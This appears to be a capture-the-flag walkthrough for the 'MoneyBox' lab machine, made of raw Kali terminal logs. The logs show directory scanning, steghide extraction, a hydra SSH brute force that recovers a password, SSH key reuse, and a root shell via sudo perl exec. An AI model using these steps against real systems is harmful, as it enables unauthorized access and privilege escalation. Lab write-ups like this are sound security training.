@@ -1,0 +1,175 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://192.168.195.230                                                                                 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Oct 11 12:03:53 2025
+URL_BASE: http://192.168.195.230/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.195.230/ ----
+==> DIRECTORY: http://192.168.195.230/blogs/                                                                        
++ http://192.168.195.230/index.html (CODE:200|SIZE:621)                                                             
+^C> Testing: http://192.168.195.230/resin-admin                                                                     
+
+
+source code of /blog/
+takes us to another page where the source code gives the password necessary for the steghide
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# steghide extract -sf trytofind.jpg -xf data.txt -p '3xtr4ctd4t4'
+wrote extracted data to "data.txt".
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat data.txt 
+Hello.....  renu
+
+      I tell you something Important.Your Password is too Week So Change Your Password
+Don't Underestimate it.......
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.195.230 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-11 12:07:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.195.230:22/
+[22][ssh] host: 192.168.195.230   login: renu   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-11 12:08:21
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh renu@192.168.195.230                                        
+The authenticity of host '192.168.195.230 (192.168.195.230)' can't be established.
+ED25519 key fingerprint is SHA256:4skFgbTuZiVgZGtWwAh5WRXgKXTdP7U5BhYUsIg9nWw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.195.230' (ED25519) to the list of known hosts.
+renu@192.168.195.230's password: 
+Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Sep 23 10:00:13 2022
+renu@MoneyBox:~$ sudo -l
+[sudo] password for renu: 
+Sorry, user renu may not run sudo on MoneyBox.
+renu@MoneyBox:~$ ls -lsa
+total 40
+4 drwxr-xr-x 5 renu renu 4096 Oct 11  2022 .
+4 drwxr-xr-x 4 root root 4096 Feb 26  2021 ..
+4 -rw------- 1 renu renu  642 Feb 26  2021 .bash_history
+4 -rw-r--r-- 1 renu renu  220 Apr 17  2019 .bash_logout
+4 -rw-r--r-- 1 renu renu 3526 Apr 17  2019 .bashrc
+4 drwxr-xr-x 3 root root 4096 Feb 26  2021 ftp
+4 drwxr-xr-x 3 renu renu 4096 Feb 26  2021 .local
+4 -rw-r--r-- 1 root root   33 Oct 11 08:48 local.txt
+4 -rw-r--r-- 1 renu renu  807 Apr 17  2019 .profile
+4 drwx------ 2 renu renu 4096 Feb 26  2021 .ssh
+renu@MoneyBox:~$ 
+renu@MoneyBox:~$ cat .bash_history
+cler
+ls
+ls -la
+cd /home
+ls
+clear
+cd
+ls
+ls -la
+exit
+clear
+ls
+ls -la
+cd /home
+ls
+cd lily
+ls
+ls -la
+clear
+cd
+clear
+ssh-keygen -t rsa
+clear
+cd .ssh
+ls
+ssh-copy-id lily@192.168.43.80
+
+
+renu@MoneyBox:~$ ssh -i id_rsa lily@192.168.195.230
+Warning: Identity file id_rsa not accessible: No such file or directory.
+The authenticity of host '192.168.195.230 (192.168.195.230)' can't be established.
+ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/renu/.ssh/known_hosts).
+Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
+lily@MoneyBox:~$ 
+
+
+lily@MoneyBox:~$ sudo -l
+Matching Defaults entries for lily on MoneyBox:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lily may run the following commands on MoneyBox:
+    (ALL : ALL) NOPASSWD: /usr/bin/perl
+lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+
+# cat .root.txt
+
+Congratulations.......!
+
+You Successfully completed MoneyBox
+
+Finally The Root Flag
+    ==> r00t{H4ckth3p14n3t}
+
+I'm Kirthik-KarvendhanT
+    It's My First CTF Box
+         
+instagram : ____kirthik____
+
+See You Back....
+       
+# 
+
+
+
